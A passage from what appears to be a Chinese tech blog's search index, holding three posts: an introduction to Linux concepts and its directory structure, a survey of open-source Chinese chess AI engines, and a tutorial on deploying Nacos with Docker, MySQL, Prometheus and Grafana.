虽然是一个安全、稳定且功能强大的操作系统，但它也一直是一种大型的而且对运行平台要求很高的操作系统，只能在工作站或小型机上才能发挥全部功能，并且价格昂贵，对普通用户来说是可望而不可及的，这为后来 Linux 的崛起提供了机会，Linux 是一个类 Unix 操作系统 Linux 是免费的、不受版权制约、与 Unix 兼容的操作系统 Linux 在 x86 架构上实现了 Unix 系统的全部特性，具有多用户多任务的能力，同时保持了高效性和稳定性，Linux 具有如下优秀的特点： 开放性 完全免费 多用户 多任务 良好的用户界面 设备独立性 提供了丰富的网络功能 可靠的系统安全性 良好的可移植性 Linux 内核及发行版Linux 内核版本内核（Kernel）是系统的心脏，是运行程序和管理像磁盘和打印机等硬件设备的核心程序，它提供了一个在裸设备与应用程序间的抽象层。Linux 内核源码的官网：https://www.kernel.org，所有来自全世界的对 Linux 源码的修改最终都会汇总到这个网站，由 Linus 领导的开源社区对其进行甄别和修改，最终决定是否进入到 Linux 主线内核源码中。Linux 内核版本又分为稳定版和开发版，两种版本是相互关联，相互循环： 稳定版：具有工业级强度，可以广泛地应用和部署。新的稳定版相对于较旧的只是修正一些 Bug 或加入一些新的驱动程序 开发版：由于要试验各种解决方案，所以变化很快 Linux 发行版本Linux 发行版 (也被叫做 GNU/Linux 发行版) 通常包含了包括桌面环境、办公套件、媒体播放器、数据库等应用软件。这些操作系统通常由 Linux 内核、以及来自 GNU 计划的大量的函式库和基于 X Window 的图形界面组成，在 X Window 中用户同样可以通过使用鼠标对窗口、菜单等进行操作来完成相应的工作。X Window 系统是一个非常出色的图形窗口系统，是类 UNIX 系统的图形用户界面的工业标准，其最重要的特征之一就是它的结构与设备无关。X Window 系统的主要特点如下： X Window 系统是客户端 / 服务端架构的，它的实现是与操作系统内核分开的，其主要由 X Server 和 X Client 两部分组成 X Window 系统不是 Unix/Linux 操作系统的必须的构成部分，而只是一个可选的应用程序组件 附：2014 年与 2015 年最流行的 Linux 发行版的排行榜如下： POSITION 2015 2014 1 Linux Mint Linux Mint 2 Debian Ubuntu 3 Ubuntu Debian 4 openSUSE openSUSE 5 Fedora Fedora 6 Mageia Mageia 7 Manjaro Arch 8 CentOS Elementary 9 Arch CentOS 10 Elementary Zorin Unix/Linux 开发应用领域 Unix/Linux服务器：是目前 Unix/Linux 应用最多的一个领域，可以提供 Web、FTP、Gopher、SMTP/POP3、Proxy/Cache、DNS 等服务器，支持服务器集群，支持虚拟主机、虚拟服务等。 嵌入式 Linux 系统：嵌入式 Linux 是将流行的 Linux 操作系统进行剪裁修改，能够在嵌入式计算机系统上运行的一种操作系统。Linux 嵌入式系统能够支持多种 CPU 和硬件平台，性能稳定，剪裁性好，开发和使用容易，其中包括 Embedix、uCLinux、muLinux 等。 桌面应用：近年来，Linux 系统特别强调在桌面应用方面的改进，目前已经完全可以作为一种集办公应用、多媒体应用、网络应用等多方面功能于一体的图形界面操作系统，在办公应用方面，Unix/Linux 集成了 OpenOffice、SUN 公司的 StarOffice 以及 KOffice 等工具。 电子政务：随着 Linux 的快速发展，Linux 已逐渐成为 Windows 系统重要的竞争力量。尤其是 Linux 在安全性方面的独特优势，又使得 Linux 在政府应用领域得到很大的发展。目前一些国家正将其电子政务系统向 Linux 平台迁移。中国政府也对 Linux 给予极大的支持。 Linux 文件系统目录 目录是一组相关文件的集合 一个目录下面除了可以存放文件之外还可以存放其他目录，即可包含子目录 在确定文件、目录位置时，DOS 和 Unix/Linux 都采用 路径名 + 文件名 的方式，路径反映的是目录与目录之间的关系 路径Unix/Linux 路径由到达定位文件的目录组成。在 Unix/Linux 系统中组成路径的目录分割符为斜杠 /，而 DOS 则用反斜杠 ‘` 来分割各个目录。路径分为绝对路径和相对路径： 绝对路径 绝对路径是从目录树的树根 / 目录开始往下直至到达文件所经过的所有节点目录 下级目录接在上级目录后面用 / 隔开 绝对路径都是从 / 开始的，所以第一个字符一定是 / 相对路径 相对路径是指目标目录相对于当前目录的位置 如果不在当前目录下，则需要使用两个特殊目录 . 和 .. 了，这里的目录 . 指向当前目录，而目录 .. 指向上级目录 一切皆文件Unix/Linux 对数据文件（.mp3、.bmp），程序文件（.c、.h、.o），设备文件（LCD、触摸屏、鼠标），网络文件（Socket）等的管理都抽象为文件，使用统一的方式方法管理。在 Unix/Linux 操作系统中也必须区分文件类型，通过文件类型可以判断文件属于可执行文件、文本文件还是数据文件。值得一提的是，在 Unix/Linux 系统中文件可以没有扩展名，文件名区分大小写。 文件的类型通常，Unix/Linux 系统中常用的文件类型有 5 种：普通文件、目录文件、设备文件、管道文件和链接文件。 普通文件：普通文件是计算机操作系统用于存放数据、程序等信息的文件，一般都长期存放于外存储器（磁盘、磁带等）中。普通文件一般包括文本文件、数据文件、可执行的二进制程序文件等 目录文件：Unix/Linux 系统把目录看成是一种特殊的文件，利用它构成文件系统的树型结构，每个目录文件至少包括两个条目，.. 表示上一级目录，. 表示该目录本身 链接文件：似于 Windows 下的快捷方式，链接又可以分为软链接（符号链接）和硬链接 管道文件：管道文件也是 Unix/Linux 中较特殊的文件类型，这类文件多用于进程间的通信 设备文件：Unix/Linux 系统把每个设备都映射成一个文件，这就是设备文件。它是用于向 I/O 设备提供连接的一种文件，分为字符设备和块设备文件。字符设备的存取以一个字符为单位，块设备的存取以字符块为单位。每一种 I/O 设备对应一个设备文件，存放在 /dev 目录中 文件的权限文件权限就是文件的访问控制权限，即哪些用户和组群可以访问文件以及可以执行什么样的操作。Unix/Linux 系统是一个典型的多用户系统，不同的用户处于不同的地位，对文件和目录有不同的访问权限。为了保护系统的安全性，Unix/Linux 系统除了对用户权限作了严格的界定外，还在用户身份认证、访问控制、传输安全、文件读写权限等方面作了周密的控制。在 Unix/Linux 中的每一个文件或目录都包含有访问权限，这些访问权限决定了谁能访问和如何访问这些文件和目录。 访问用户通过设定权限可以从以下三种访问方式限制访问权限： 只允许用户自己访问（所有者）：所有者就是创建文件的用户，用户是所有用户所创建文件的所有者，用户可以允许所在的用户组能访问用户的文件 允许一个预先指定的用户组中的用户访问：用户组由不同的用户组成，例如，某一类或某一项目中的所有用户都能够被系统管理员归为一个用户组，一个用户能够授予所在用户组的其他成员的文件访问权限 允许系统中的任何用户访问（其他用户）：用户也可以将自己的文件向系统内的所有用户开放，在这种情况下，系统内的所有用户都能够访问用户的目录或文件。在这种意义上，系统内的其他所有用户就是 other 用户类 访问权限用户能够控制一个给定的文件或目录的访问权限，一个文件或目录可能有读、写及执行权限： 读权限（r）：对文件而言，具有读取文件内容的权限；对目录来说，具有浏览目录的权限 写权限（w）：对文件而言，具有新增、修改、删除文件内容的权限；对目录来说，具有创建、删除、移动目录内文件的权限 可执行权限（x）：对文件而言，具有执行文件的权限；对目录来说，该用户具有进入目录的权限 a) 第 1 个字母代表文件的类型：d 代表文件夹、- 代表普通文件、c 代表硬件字符设备、b 代表硬件块设备、s 表示管道文件、l 代表软链接文件 b) 后 9 个字母依次代表三组权限：文件所有者、用户组、其他用户拥有的权限 第一组权限控制访问自己的文件权限，即所有者权限 第二组权限控制用户组其中一个用户访问文件的权限 第三组权限控制其他所有用户访问文件的权限 c) 这三组权限赋予用户不同类型（即所有者、用户组和其他用户）的读、写及执行权限，这就构成了一共有 9 种类型的权限组 Linux 目录结构说明 /：根目录，一般根目录下只存放目录，在 Linux 下有且只有一个根目录，所有的东西都是从这里开始。当在终端里输入 /home，其实是在告诉系统，先从 /（根目录） 开始，再进入到 home 目录 /bin、/usr/bin: 可执行二进制文件的目录，如常用的命令 ls、tar、mv、cat 等 /boot：放置 Linux 系统启动时用到的一些文件，如 Linux 的内核文件：/boot/vmlinuz，系统引导管理器：/boot/grub /dev：存放 Linux 系统下的设备文件，访问该目录下某个文件，相当于访问某个设备，常用的是挂载光驱命令 mount /dev/cdrom /mnt /etc：系统配置文件存放的目录，不建议在此目录下存放可执行文件，重要的配置文件有 /etc/inittab、/etc/fstab、/etc/init.d、/etc/X11、/etc/sysconfig、/etc/xinetd.d /home：系统默认的用户家目录，新增用户账号时，用户的家目录都存放在此目录下，~ 表示当前用户的家目录，~edu 表示用户 edu 的家目录 /lib、/usr/lib、/usr/local/lib：系统使用的函数库的目录，程序在执行过程中，需要调用一些额外的参数时需要函数库的协助 /lost+fount：系统异常产生错误时，会将一些遗失的片段放置于此目录下 /mnt、/media：光盘默认挂载点，通常光盘挂载于 /mnt/cdrom 下，但也不一定，可以选择任意位置进行挂载 /opt：给主机额外安装软件所摆放的目录 /proc：此目录的数据都在内存中，如系统核心，外部设备，网络状态，由于数据都存放于内存中，所以不占用磁盘空间，比较重要的目录有 /proc/cpuinfo、/proc/interrupts、/proc/dma、/proc/ioports、/proc/net/* /root：系统管理员 root 的家目录 /sbin、/usr/sbin、/usr/local/sbin：放置系统管理员使用的可执行命令，如 fdisk、shutdown、mount 等。与 /bin 不同的是，这几个目录是给系统管理员 root 使用的命令，一般用户只能查看而不能设置和使用 /tmp 一般用户或正在执行的程序临时存放文件的目录，任何人都可以访问，重要数据不可放置在此目录下 /srv：服务启动之后需要访问的数据目录，如网页服务需要访问的网页数据存放在 /srv/www 内 /usr：应用程序存放的目录，例如 /usr/bin 存放应用程序，/usr/share 存放共享数据，/usr/lib 存放不能直接运行的，却是许多程序运行所必需的一些函数库文件，/usr/local 存放软件升级包，/usr/share/doc 系统说明文件存放目录，/usr/share/man 程序说明文件存放目录 /var：放置系统执行过程中经常变化的文件，例如 /var/log：存放随时更改的日志文件，/var/spool/mail：存放邮件的目录，/var/run：程序或服务启动后，其 PID 存放的目录 Windows 和 Linux 文件系统在 Windows 平台下，打开 计算机 界面，可以看到的是一个个的驱动器盘符，而每个驱动器都有自己的根目录结构，这样形成了多颗树并列的情形，如下图所示： 在 Linux 下，是看不到这些驱动器盘符，看到的只有文件夹（目录）。在早期的 UNIX 系统中，各个厂家各自定义了自己的 UNIX 系统文件目录，比较混乱。Linux 面世不久后，对文件目录进行了标准化，于 1994 年对根文件目录做了统一的规范，推出 FHS（Filesystem Hierarchy Standard）的 Linux 文件系统层次结构标准。FHS 标准规定了 Linux 根目录各文件夹的名称及作用，统一了 Linux 界命名混乱的局面。和 Windows 操作系统类似，所有 Unix/Linux 的数据都是由文件系统按照树型目录结构管理的，而且 Unix/Linux 操作系统同样要区分文件的类型，判断文件的存取属性和可执行属性。但 Unix/Linux 文件系统不使用驱动器这个概念，而是使用单一的根目录结构，所有的分区都挂载到单一的 / 目录上，其结构示意图如下图所示： var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux系统编程"},{title:"中国象棋之一开源 AI 引擎介绍",url:"/posts/26ffa5e3.html",text:'大纲 中国象棋之一开源 AI 引擎介绍 中国象棋之二 ElephantEye 引擎深入理解 中国象棋之三 Linux 下的象棋软件 GMChess 前言本文将介绍针对中国象棋的开源 AI 引擎，旨在对希望打造自己的中国象棋引擎的开发者提供一点帮助。目前中国象棋 AI 引擎主要分为两类，第一类是传统的象棋 AI 引擎（如象棋名手、象棋旋风），属于 CPU 密集计算型的引擎；第二类则是基于 Alpha-Zero 深度强化学习算法的新兴 AI 引擎，属于 GPU 密集计算型的引擎。由于谷歌的 DeepMind Alpha-Zero 已经 “通杀” 围棋、国际象棋、日本将棋，因此第二类中国象棋 AI 引擎非常值得关注。 开源象棋引擎HarmlessHarmless 是一款 Linux 下的中国象棋引擎，在普通机器上限定每步 6 秒时间的情况下，平均搜索深度在 5-8 层左右。核心搜索主要采用的是极小窗口搜索，并结合了哈希表技术和历史启发；评估函数则相对实现得比较简单，只考虑了棋子本身的价值和棋子间的灵活度，虽不靠谱，但基本能用。引擎部分完全用 C 语言实现，支持部分 UCCI 通信协议，并附带了一个简单的图形界面，运行环境依赖 Python-2.7.x 与 Pygame-1.9.x。附上原作者对该项目的博客分享：写了一个 Linux 下的中国象棋引擎。 UCCI-ChessEnginesUCCI-ChessEngines 是中国象棋 UCCI 引擎源码的整理，引擎包括 ElephantEye（象眼）、 BitStronger、Eleeye、Mars、梦入神蛋 MRSD2（浅红引擎） ChineseChess-EnginesChineseChess-Engines 是基于 UCCI-ChessEngines 项目，整理了中国象棋 UCCI 引擎的源码，在原基础上做了大量修改，使其支持在 Linux 上运行，修改内容如下： 增加了 Harmless 象棋引擎，Ubuntu 编译通过，支持 UCCI BitStronger：增加了 makefile, Ubuntu 编译通过，支持 UCCI ElephantEye（象眼）：增加了 makefile, Ubuntu 编译通过，支持 UCCI Mars：修改了相关代码，更改了编码方式为 UTF-8，增加了 makefile，Ubuntu 编译通过，支持 UCCI 梦入神蛋 MRSD2（浅红引擎）：修改了相关代码，更改了编码方式为 UTF-8，修改了 makefile，Ubuntu 编译通过，不支持 UCCI cchess-zerocchess-zero 是基于 Alpha-Zero 的实践项目，实现了一个中国象棋程序，使用 TensorFlow1.0 和 Python3.5 开发。附上原作者对该项目的博客分享：Alpha-Zero 实践 — 中国象棋（附论文翻译）。 icyChessZeroicyChessZero 受到 Alpha-Zero 的启发，旨在训练一个中等人类水平或高于中等人类水平的深度神经网络，来完成下中国象棋的任务。目前该项目仍然没有完成全部的开发，处于停滞状态。附上原作者对该项目的博客分享：一个分布式中国象棋 Alpha Zero。 CCZeroCCZero 的目标是将 Alpha-Zero 的算法应用到了中国象棋上，旨在借助广大象棋爱好者之力一起训练出一个可以打败旋风名手的 “象棋之神”。因为种种原因，这个目标截止 2018/11/07 为止仍未能实现，或者说还差得远，而且跑谱的人也越来越少了，作者已经放弃该项目。附上原作者对该项目的博客分享：中国象棋 Zero 技术详解。 GGzeroGGzero 采用了谷歌 DeepMind 公司提出的 Alpha-Zero 深度强化学习算法，基于国际象棋引擎 leela-chess 进行开发，是目前世界上首款达到商业引擎水平的显卡加速象棋引擎。GGzero 项目是一个团队在维护，创作者是佳佳象棋的作者李国来；目前就 Elo 分来说是最强的，但发展状况逐渐呈现商业化趋势（作者没有公开发布最新的代码），更多资料可在社区论坛上获取。值得一提的是，GGzero 曾获得第三届楚河汉界象棋人工智能大赛第三名，2019 年北京人工智能大赛并列第二名，比赛规则与机器配置如下： 赛制用时：10 分钟 + 3 秒 其它商业引擎的机器配置：Xeon 2696 V4（44 核心），有开局库，有残局库 GGzero 的机器配置：Nvidia GeForce RTX 2070 Super X 4，无开局库，无残局库 中国象棋引擎排行榜 第一阵营：象棋名手、象棋旋风 第二阵营：小虫象棋、天机象棋、Alpha 猫、佳佳象棋、南奥象棋 第三阵营：UFX、象棋天启 其他棋类的开源 AI 引擎 围棋（leela-zero） 黑白棋（reversi-alpha-zero） 国际象棋（chess-alpha-zero） 五子棋（AlphaZero-Gomoku） 参考资料 象棋百科 中国象棋 AI 实现 28 天自制你的 AlphaGo（3）：训练策略网络，真正与之对弈 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"开源项目"},{title:"Docker 安装 Nacos 单机和集群",url:"/posts/961beae9.html",text:'前言本文主要介绍如何使用 Docker 安装并管理 Nacos 的镜像和容器，涉及到 Nacos 单机版与集群版的安装，并连接上 MySQL 数据库，同时还会介绍 Prometheus 与 Grafana 监控系统的使用。 1.0、软件环境 CentOS 7.9 Docker 20.10.1 Docker-Compose 1.24.0-rc1 Nacos 1.4.0（截止目前最新的版本） 1.1、快速启动单机模式快速启动 Nacos，使用嵌入式数据库 1# docker run --name nacos-standalone-embedded -e MODE=standalone -p 8848:8848 -d nacos/nacos-server:latest 单机模式快速启动 Nacos，使用 MySQL 数据库 1234567891011121314151617# docker run -d \\-e MODE=standalone \\-e SPRING_DATASOURCE_PLATFORM=mysql \\-e MYSQL_SERVICE_HOST=ip \\-e MYSQL_SERVICE_PORT=3306 \\-e MYSQL_SERVICE_USER=nacos \\-e MYSQL_SERVICE_PASSWORD=nacos \\-e MYSQL_SERVICE_DB_NAME=nacos_devtest \\-p 8848:8848 \\--restart=always \\--name nacos-standalone-mysql \\nacos/nacos-server:latest## 特别注意：## 1) MySQL 数据库必须是已经初始化过的，即已经创建好 Nacos 运行所需的数据库表## 2) MySQL 的 IP 必须是在 Nacos 容器内部可以直接访问到的 IP，一般情况下不能直接使用 `127.0.0.1`## 3) 若 MySQL 不是运行在 Docker 容器内，而是直接安装在外网或者宿主机内，可以指定 `--net=host` 参数让 Nacos 容器共享宿主机的网络 1.2、Clone Nacos 项目1234567891011# 拉取Nacos项目的源码$ git clone https://github.com/alibaba/nacos# 后面会使用 nacos-mysql.sql 来初始化MySQL数据库$ tree nacos/distribution/conf├── application.properties├── application.properties.example├── cluster.conf.example├── nacos-mysql.sql├── nacos-logback.xml└── schema.sql 1.3、Clone Nacos Docker 项目12345678910111213141516171819202122232425262728293031323334353637# 拉取Nacos Docker项目的源码$ git clone https://github.com/nacos-group/nacos-docker.git# 进入项目目录$ cd nacos-docker# 目录结构$ tree├── build│&nbsp;&nbsp; ├── bin│&nbsp;&nbsp; │&nbsp;&nbsp; └── docker-startup.sh│&nbsp;&nbsp; ├── conf│&nbsp;&nbsp; │&nbsp;&nbsp; └── application.properties│&nbsp;&nbsp; ├── Dockerfile│&nbsp;&nbsp; └── init.d│&nbsp;&nbsp; └── custom.properties├── changlog├── env│&nbsp;&nbsp; ├── mysql.env│&nbsp;&nbsp; ├── nacos-embedded.env│&nbsp;&nbsp; ├── nacos-hostname.env│&nbsp;&nbsp; ├── nacos-ip.env│&nbsp;&nbsp; └── nacos-standlone-mysql.env├── example│&nbsp;&nbsp; ├── cluster-embedded.yaml│&nbsp;&nbsp; ├── cluster-hostname.yaml│&nbsp;&nbsp; ├── cluster-ip.yaml│&nbsp;&nbsp; ├── init.d│&nbsp;&nbsp; │&nbsp;&nbsp; └── custom.properties│&nbsp;&nbsp; ├── prometheus│&nbsp;&nbsp; │&nbsp;&nbsp; ├── prometheus-cluster.yaml│&nbsp;&nbsp; │&nbsp;&nbsp; └── prometheus-standalone.yaml│&nbsp;&nbsp; ├── standalone-derby.yaml│&nbsp;&nbsp; ├── standalone-mysql-5.7.yaml│&nbsp;&nbsp; └── standalone-mysql-8.yaml├── README.md└── README_ZH.md 目录结构说明： example：Docker-Compose 编排示例 example/init.d：启动 Nacos 容器时的自定义配置（应用级别），例如 Metrics 监控相关的内容 build：用于构建 Nacos 镜像的源码，包括配置文件、Shell 脚本与 Dockerfile env：Docker-Compose 的环境变量文件，例如定义 MySQL 数据库的用户名、密码和端口号、Nacos 集群各节点的 IP Nacos 单机模式启动2.0、Nacos 监控关闭在 Nacos 官方的 Docker 项目里，Nacos 单机版（Derby、MySQL 5.7）默认集成了 Prometheus 与 Grafana 监控。即在 example/standalone-xxx.yaml 配置文件里，除了已经配置了 Nacos 的镜像，还配置了 Prometheus、Grafana 作为监控系统。如果不需要监控 Nacos，可以删除对应的配置内容，具体操作如下： 1）配置 Nacos 不暴露 Metrics 数据 123# 编辑Properties配置文件$ vim example/init.d/custom.propertiesmanagement.endpoints.web.exposure.include=* #注释掉这行内容，注释后访问"http://{ip}:8848/nacos/actuator/prometheus" 不会再看到Metrics数据 2）删除 Prometheus、Grafana 的 Docker-Compose 配置 12345678910111213141516171819# 编辑YAML配置文件，删除以下内容$ vim example standalone-derby.yamlprometheus: container_name: prometheus image: prom/prometheus:latest volumes: - ./prometheus/prometheus-standalone.yaml:/etc/prometheus/prometheus.yml ports: - "9090:9090" depends_on: - nacos restart: on-failuregrafana: container_name: grafana image: grafana/grafana:latest ports: - 3000:3000 restart: on-failure 2.1、Nacos + Derby单机模式启动 Nacos 容器，默认使用的是嵌入式数据库 Derby 12345# 创建并前台启动容器# docker-compose -f example/standalone-derby.yaml up# 或者创建并后台启动容器# docker-compose -f example/standalone-derby.yaml up -d Docker-Compose 常用的容器管理命令，后面创建的所有容器都可以这样管理，不再累述。 1234567891011# 查看容器的运行状态# docker-compose -f example/standalone-derby.yaml ps# 启动容器# docker-compose -f example/standalone-derby.yaml start# 停止容器# docker-compose -f example/standalone-derby.yaml stop# 停止并删除容器，包括网络、数据卷（特别注意，此操作会删除所有容器的数据，且不可恢复）# docker-compose -f example/standalone-derby.yaml down 2.2、Nacos + MySQL 5.7单机模式启动 Nacos 容器，数据库使用的是 MySQL 5.7，这里需要手动执行 MySQL 数据库初始化操作，否则 Nacos 启动时会抛出 No DataSource set 异常，导致无法连接上 MySQL 数据库 12345# 创建并前台启动容器# docker-compose -f example/standalone-mysql-5.7.yaml up# 或者创建并后台启动容器# docker-compose -f example/standalone-mysql-5.7.yaml up -d 2.3、Nacos + MySQL 8单机模式启动 Nacos 容器，数据库使用的是 MySQL 8，这里需要手动执行 MySQL 数据库初始化操作，否则 Nacos 启动时会抛出 No DataSource set 异常，导致无法连接上 MySQL 数据库 12345# 创建并前台启动容器# docker-compose -f example/standalone-mysql-8.yaml up# 或者创建并后台启动容器# docker-compose -f example/standalone-mysql-8.yaml up -d 2.4、Nacos 单机模式测试2.4.1、调用 OPEN API1234567891011# 发布配置$ curl -X POST "http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=nacos.cfg.dataId&amp;group=test&amp;content=helloWorld"# 获取配置$ curl -X GET "http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=nacos.cfg.dataId&amp;group=test"# 服务注册$ curl -X POST \'http://127.0.0.1:8848/nacos/v1/ns/instance?serviceName=nacos.naming.serviceName&amp;ip=20.18.7.10&amp;port=8080\'# 服务发现$ curl -X GET \'http://127.0.0.1:8848/nacos/v1/ns/instance/list?serviceName=nacos.naming.serviceName\' 2.4.2、访问 Nacos 的控制台浏览器访问 http://127.0.0.1:8848/nacos，打开 Nacos 的控制台 Nacos 集群模式启动Nacos 的集群模式需要依赖 MySQL 数据库（集中式存储），因此在集群模式下不能再使用 Nacos 自带的嵌入式数据库 Derby。在 Nacos 官方的 Docker 项目中，以集群模式启动 Nacos，默认使用的是单个 MySQL 数据库。值得一提的是，从 Nacos 1.1.4 镜像开始，后续所有镜像都已经移除了主从镜像相关属性的配置。由于在 Nacos 的生产环境中，MySQL 至少需要主备模式，或者采用高可用数据库；因此如果需要配置 MySQL 主从库，需要自行实现（如搭建 DB-Proxy）。 3.0、Nacos + MySQL 5.7基于 HostName，集群模式启动 Nacos 容器，数据库使用的是 MySQL 5.7（单机），这里需要手动执行 MySQL 数据库初始化操作，否则 Nacos 启动时会抛出 No DataSource set 异常，导致无法连接上 MySQL 数据库 12345# 创建并前台启动容器# docker-compose -f example/cluster-hostname.yaml up# 或者创建并后台启动容器# docker-compose -f example/cluster-hostname.yaml up -d 基于 IP，集群模式启动 Nacos 容器，数据库使用的是 MySQL 5.7（单机），这里需要手动执行 MySQL 数据库初始化操作，否则 Nacos 启动时会抛出 No DataSource set 异常，导致无法连接上 MySQL 数据库 12345# 创建并前台启动容器# docker-compose -f example/cluster-ip.yaml up# 或者创建并后台启动容器# docker-compose -f example/cluster-ip.yaml up -d 查看 Nacos 的日志文件，若日志信息如下显示，则说明 Nacos 是以集群模式启动的 12345678# tail -n 20 example/cluster-logs/nacos1/nacos.log# tail -n 20 example/cluster-logs/nacos2/nacos.log# tail -n 20 example/cluster-logs/nacos3/nacos.log2020-03-12 21:20:17,866 INFO Nacos started successfully in cluster mode. use external storage2020-03-12 21:20:18,117 INFO Initializing Spring DispatcherServlet \'dispatcherServlet\'2020-03-12 21:20:18,117 INFO Initializing Servlet \'dispatcherServlet\'2020-03-12 21:20:18,141 INFO Completed initialization in 23 ms 3.1、Nacos 集群模式测试3.1.1、调用 OPEN API1234567891011# 发布配置$ curl -X POST "http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=nacos.cfg.dataId&amp;group=test&amp;content=helloWorld"# 获取配置$ curl -X GET "http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=nacos.cfg.dataId&amp;group=test"# 服务注册$ curl -X POST \'http://127.0.0.1:8848/nacos/v1/ns/instance?serviceName=nacos.naming.serviceName&amp;ip=20.18.7.10&amp;port=8080\'# 服务发现$ curl -X GET \'http://127.0.0.1:8848/nacos/v1/ns/instance/list?serviceName=nacos.naming.serviceName\' 3.1.2、访问 Nacos 的控制台浏览器访问 http://127.0.0.1:8848/nacos，打开 Nacos 的控制台；若 Nacos 集群启动成功，可以看到多个 Nacos 节点，Docker 的映射端口分别是 8848、8849、8850 Prometheus 与 Grafana 监控在 Nacos 官方的 Docker 项目里，Nacos 单机版（Derby、MySQL 5.7）默认集成了 Prometheus 与 Grafana 监控，一般情况下开箱即用。 4.0、创建并启动容器12# 创建并后台启动容器# docker-compose -f example/standalone-mysql-5.7.yaml up -d 4.1、调用 OPEN API为了让 Prometheus 与 Grafana 的监控面板有数据可显示，调用 OPEN API 插入模拟数据 12345# 发布配置$ curl -X POST "http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=nacos.cfg.dataId&amp;group=test&amp;content=helloWorld"# 服务注册$ curl -X POST \'http://127.0.0.1:8848/nacos/v1/ns/instance?serviceName=nacos.naming.serviceName&amp;ip=20.18.7.10&amp;port=8080\' 4.2、访问 Prometheus 的控制台 1）浏览器访问 http://127.0.0.1:9090/graph，打开 Prometheus 的控制台，查看 Prometheus 采集到的 Nacos Metrics 数据 2）在搜索栏搜索 nacos_monitor，若可以搜索到 Nacos 的数据，则说明 Prometheus 采集数据成功 3）若 Prometheus 采集不到数据，浏览器访问 http://{ip}:8848/nacos/actuator/prometheus，看能不能获取到 Nacos 的 Metrics 数据 4.3、访问 Grafana 的控制台 1）下载 Nacos 的 Grafana 监控模版文件 1234567891011# 拉取Nacos Template项目的源码$ git clone https://github.com/nacos-group/nacos-template# 后面要用到 nacos-grafana.json 监控模版文件# tree -N├── nacos-grafana.json├── nacos-sync-grafana├── README.md├── 方案评审内容模板.md├── 模板-Nacos（微软黑体）.ppt└── 模板-Nacos（微软黑体）新版本.key 2）浏览器访问 http://127.0.0.1:3000，默认登录的用户名和密码为 admin/admin，首次登录会提示重新设置新密码 3）创建 Prometheus 数据源 特别注意：Grafana 创建 Prometheus 新数据源时，数据源名称（区分英文大小写）必须是 prometheus，数据源地址必须是 http://prometheus:9090，否则会获取不到监控数据或者提示 Gateway 相关的错误信息 4）导入 Nacos 的 Grafana 监控模版文件 nacos-grafana.json 5）Nacos Grafana 展示的核心监控项 Docker 部署问题汇总5.0、MySQL 启动失败发现 MySQL 容器启动失败 1234567# 查看容器的运行状态$ docker-compose -f example/standalone-mysql-5.7.yaml psgrafana /run.sh Up 0.0.0.0:3000-&gt;3000/tcpmysql docker-entrypoint.sh mysqld Exit 1nacos-standalone-mysql bin/docker-startup.sh Up 0.0.0.0:8848-&gt;8848/tcp, 0.0.0.0:9555-&gt;9555/tcpprometheus /bin/prometheus --config.f ... Up 0.0.0.0:9090-&gt;9090/tcp 查看 MySQL 的日志信息，发现可能是 MySQL 首次启动时生成相关证书（登录）失败导致 1234567891011121314151617181920212223242526272829# 查看容器的运行状态$ docker-compose -f example/standalone-mysql-5.7.yaml logs mysqlmysql | Database initializedmysql | Initializing certificatesmysql | Generating a RSA private keymysql | ..+++++mysql | ..................................+++++mysql | unable to write \'random state\'mysql | writing new private key to \'ca-key.pem\'mysql | -----mysql | Generating a RSA private keymysql | .......................+++++mysql | ......+++++mysql | unable to write \'random state\'mysql | writing new private key to \'server-key.pem\'mysql | -----mysql | Generating a RSA private keymysql | ..............................................................+++++mysql | ...............+++++mysql | unable to write \'random state\'mysql | writing new private key to \'client-key.pem\'mysql | -----mysql | mysql_ssl_rsa_setup: Can\'t change permissions of the file \'ca-key.pem\' (Errcode: 1 - Operation not permitted)mysql | 2020-03-12 22:13:39 [ERROR] Error setting file permissions forca-key.pem and ca.pemmysql | mysql_ssl_rsa_setup: Can\'t change permissions of the file \'server-key.pem\' (Errcode: 1 - Operation not permitted)mysql | 2020-03-12 22:13:39 [ERROR] Error setting file permissions forserver-key.pem and server-cert.pemmysql | mysql_ssl_rsa_setup: Can\'t change permissions of the file \'client-key.pem\' (Errcode: 1 - Operation not permitted)mysql | 2020-03-12 22:13:39 [ERROR] Error setting file permissions forclient-key.pem and client-cert.pem 关闭所有容器，然后再重启所有容器，至此 MySQL 容器可以正常启动 12345678910111213# 关闭所有容器# docker-compose -f example/standalone-mysql-5.7.yaml stop# 启动所有容器# docker-compose -f example/standalone-mysql-5.7.yaml start# 查看容器的运行状态$ docker-compose -f example/standalone-mysql-5.7.yaml psgrafana /run.sh Up 0.0.0.0:3000-&gt;3000/tcpmysql docker-entrypoint.sh mysqld Up 0.0.0.0:3309-&gt;3306/tcp, 33060/tcpnacos-standalone-mysql bin/docker-startup.sh Up 0.0.0.0:8848-&gt;8848/tcp, 0.0.0.0:9555-&gt;9555/tcpprometheus /bin/prometheus --config.f ... Up 0.0.0.0:9090-&gt;9090/tcp 